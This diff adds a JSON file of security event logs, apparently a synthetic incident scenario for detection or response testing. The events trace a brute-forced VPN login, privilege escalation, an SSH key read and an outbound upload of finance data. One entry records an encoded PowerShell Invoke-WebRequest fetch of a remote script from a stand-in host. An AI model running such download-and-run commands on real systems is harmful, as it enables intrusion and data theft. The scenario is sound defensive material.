@@ -1,0 +1,14 @@
+[
+  {"timestamp":"2026-09-14T08:01:12Z","source":"vpn","event_type":"login","actor":"m.rahman","host":"vpn-gw-01","ip":"185.71.66.14","action":"authenticate","outcome":"failed","details":"Invalid password"},
+  {"timestamp":"2026-09-14T08:02:02Z","source":"vpn","event_type":"login","actor":"m.rahman","host":"vpn-gw-01","ip":"185.71.66.14","action":"authenticate","outcome":"failed","details":"Invalid password"},
+  {"timestamp":"2026-09-14T08:03:18Z","source":"vpn","event_type":"login","actor":"m.rahman","host":"vpn-gw-01","ip":"185.71.66.14","action":"authenticate","outcome":"failed","details":"Invalid password"},
+  {"timestamp":"2026-09-14T08:05:00Z","source":"vpn","event_type":"login","actor":"m.rahman","host":"vpn-gw-01","ip":"185.71.66.14","action":"authenticate","outcome":"failed","details":"Invalid password"},
+  {"timestamp":"2026-09-14T08:06:44Z","source":"vpn","event_type":"login","actor":"m.rahman","host":"vpn-gw-01","ip":"185.71.66.14","action":"authenticate","outcome":"failed","details":"Invalid password"},
+  {"timestamp":"2026-09-14T08:10:22Z","source":"vpn","event_type":"login","actor":"m.rahman","host":"vpn-gw-01","ip":"51.140.11.92","action":"authenticate","outcome":"success","details":"MFA accepted"},
+  {"timestamp":"2026-09-14T08:17:05Z","source":"edr","event_type":"process","actor":"m.rahman","host":"FIN-WS-22","ip":"10.10.4.22","process":"powershell.exe","action":"download remote payload","outcome":"success","details":"EncodedCommand; Invoke-WebRequest https://update-cdn.example/p.ps1"},
+  {"timestamp":"2026-09-14T08:21:11Z","source":"edr","event_type":"file","actor":"m.rahman","host":"FIN-WS-22","process":"powershell.exe","file_path":"C:/Users/m.rahman/.ssh/id_rsa","action":"read","outcome":"success","details":"File opened by PowerShell"},
+  {"timestamp":"2026-09-14T08:24:33Z","source":"iam","event_type":"role","actor":"m.rahman","host":"idp-01","ip":"51.140.11.92","action":"privilege_escalation","outcome":"success","details":"Added to Finance-Admins"},
+  {"timestamp":"2026-09-14T08:31:20Z","source":"proxy","event_type":"network","actor":"m.rahman","host":"FIN-WS-22","ip":"91.198.174.20","process":"powershell.exe","action":"outbound connection","outcome":"success","details":"HTTPS 443 to external host"},
+  {"timestamp":"2026-09-14T08:44:10Z","source":"fileserver","event_type":"file","actor":"m.rahman","host":"FS-02","file_path":"/finance/q3/forecast.xlsx","action":"read","outcome":"success","details":"SMB file access"},
+  {"timestamp":"2026-09-14T08:52:55Z","source":"proxy","event_type":"network","actor":"m.rahman","host":"FIN-WS-22","ip":"91.198.174.20","process":"powershell.exe","action":"upload","outcome":"success","details":"12.4 MB outbound transfer"}
+]
